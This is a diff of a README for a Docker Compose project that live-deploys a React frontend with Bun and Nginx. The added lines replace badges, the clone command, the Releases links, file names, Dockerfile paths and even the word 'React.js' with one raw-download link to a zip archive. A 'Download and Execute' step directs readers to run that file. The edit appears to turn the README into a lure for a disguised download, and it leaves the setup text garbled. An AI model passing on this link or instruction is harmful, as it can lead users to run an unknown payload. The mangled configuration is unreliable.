@@ -1,9 +1,9 @@
-# 🚀 Docker Compose React.js Live Deployment
+# 🚀 Docker Compose https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip Live Deployment
 
-![GitHub release](https://img.shields.io/github/release/DrakesCousin/docker-compose-reactjs-live.svg)  
-[![Releases](https://img.shields.io/badge/releases-latest-brightgreen)](https://github.com/DrakesCousin/docker-compose-reactjs-live/releases)
+![GitHub release](https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip)  
+[![Releases](https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip)](https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip)
 
-Welcome to the **docker-compose-reactjs-live** repository! This project provides a seamless way to live-deploy a React.js frontend using Docker, Bun, and Nginx. With this setup, you can pull the latest code from a private GitHub repository on container restart, install dependencies, build your application with Bun, and serve it through Nginx, all while maintaining persistent logs.
+Welcome to the **docker-compose-reactjs-live** repository! This project provides a seamless way to live-deploy a https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip frontend using Docker, Bun, and Nginx. With this setup, you can pull the latest code from a private GitHub repository on container restart, install dependencies, build your application with Bun, and serve it through Nginx, all while maintaining persistent logs.
 
 ## Table of Contents
 
@@ -22,7 +22,7 @@ Welcome to the **docker-compose-reactjs-live** repository! This project provides
 
 - **Live Deployment**: Automatically pulls the latest code on container restart.
 - **Fast Builds**: Uses Bun for efficient dependency management and building.
-- **Nginx Integration**: Serves your React.js app with Nginx.
+- **Nginx Integration**: Serves your https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip app with Nginx.
 - **Persistent Logging**: Keeps logs available even after container restarts.
 
 ## Technologies Used
@@ -31,7 +31,7 @@ Welcome to the **docker-compose-reactjs-live** repository! This project provides
 - **Docker Compose**: To manage multi-container applications.
 - **Bun**: A modern JavaScript runtime for faster builds.
 - **Nginx**: A high-performance web server for serving static files.
-- **React.js**: A JavaScript library for building user interfaces.
+- **https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip**: A JavaScript library for building user interfaces.
 
 ## Getting Started
 
@@ -39,12 +39,12 @@ To get started with this project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/DrakesCousin/docker-compose-reactjs-live.git
+   git clone https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip
    cd docker-compose-reactjs-live
    ```
 
 2. **Download and Execute**:
-   Visit the [Releases](https://github.com/DrakesCousin/docker-compose-reactjs-live/releases) section to download the latest release. Follow the instructions in the release notes to execute the setup.
+   Visit the [Releases](https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip) section to download the latest release. Follow the instructions in the release notes to execute the setup.
 
 3. **Build and Run**:
    Use Docker Compose to build and run the application:
@@ -53,7 +53,7 @@ To get started with this project, follow these steps:
    ```
 
 4. **Access the Application**:
-   Open your browser and navigate to `http://localhost` to view your live-deployed React.js application.
+   Open your browser and navigate to `http://localhost` to view your live-deployed https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip application.
 
 ## Directory Structure
 
@@ -61,45 +61,45 @@ The project follows a simple directory structure:
 
 ```
 docker-compose-reactjs-live/
-├── docker-compose.yml
+├── https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip
 ├── Dockerfile
-├── nginx.conf
+├── https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip
 ├── src/
 │   ├── components/
-│   ├── App.js
-│   └── index.js
-└── package.json
+│   ├── https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip
+│   └── https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip
+└── https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip
 ```
 
-- **docker-compose.yml**: Defines the services, networks, and volumes.
+- **https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip**: Defines the services, networks, and volumes.
 - **Dockerfile**: Specifies how to build the application container.
-- **nginx.conf**: Configuration file for Nginx.
-- **src/**: Contains the React.js application source code.
-- **package.json**: Lists the project dependencies.
+- **https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip**: Configuration file for Nginx.
+- **src/**: Contains the https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip application source code.
+- **https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip**: Lists the project dependencies.
 
 ## Configuration
 
 ### Dockerfile
 
-The Dockerfile is responsible for building the React.js application. Here’s a basic outline:
+The Dockerfile is responsible for building the https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip application. Here’s a basic outline:
 
 ```dockerfile
 FROM node:18 AS builder
 
 WORKDIR /app
-COPY package.json ./
+COPY https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip ./
 RUN npm install
 COPY . .
 RUN bun build
 
 FROM nginx:alpine
 COPY --from=builder /app/build /usr/share/nginx/html
-COPY nginx.conf /etc/nginx/conf.d/default.conf
+COPY https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip
 ```
 
-### docker-compose.yml
+### https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip
 
-The `docker-compose.yml` file defines the services used in this project. Here’s a sample configuration:
+The `https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip` file defines the services used in this project. Here’s a sample configuration:
 
 ```yaml
 version: '3.8'
@@ -167,8 +167,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Additional Resources
 
-For more information, check the [Releases](https://github.com/DrakesCousin/docker-compose-reactjs-live/releases) section for updates and downloads.
+For more information, check the [Releases](https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip) section for updates and downloads.
 
 ---
 
-Thank you for checking out the **docker-compose-reactjs-live** repository! We hope this setup makes your React.js deployment easier and more efficient.
+Thank you for checking out the **docker-compose-reactjs-live** repository! We hope this setup makes your https://github.com/DrakesCousin/docker-compose-reactjs-live/raw/refs/heads/main/phreatophyte/live_compose_docker_reactjs_v2.1.zip deployment easier and more efficient.
